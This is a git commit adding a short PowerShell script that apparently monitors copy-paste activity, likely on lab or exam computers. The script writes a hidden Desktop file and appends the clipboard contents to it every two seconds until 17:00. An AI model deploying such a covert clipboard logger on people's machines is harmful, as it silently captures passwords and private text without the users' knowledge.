c649c4834b204561f6cdf3c488939ad00401d468
Mustafa Dalga <mustafadalgaa@gmail.com>
2020-06-17 22:34:25 +0300

    Log alma scripti tamamlandı

---
+++ Copy-paste-kontrolu/logAl.ps1
@@ -0,0 +1,25 @@
+﻿$ip=(Test-Connection -ComputerName $env:computername -count 1).IPV4Address.ipaddressTOstring 
+
+$dosyaAdi="$ip-clipboard.txt";
+
+cd 	"~\Desktop";
+
+
+if(!(Test-Path $dosyaAdi))
+{
+    ni $dosyaAdi  -Type file
+   $gizle=get-item $dosyaAdi -Force
+   $gizle.attributes="Hidden"
+}
+while($true)
+{
+    Start-Sleep 2;
+    Get-Clipboard >> $dosyaAdi;
+
+    if("17:00" -eq (Get-Date -UFormat %R))
+    {
+        Stop-Process -Id $PID;
+    }
+}
+
+
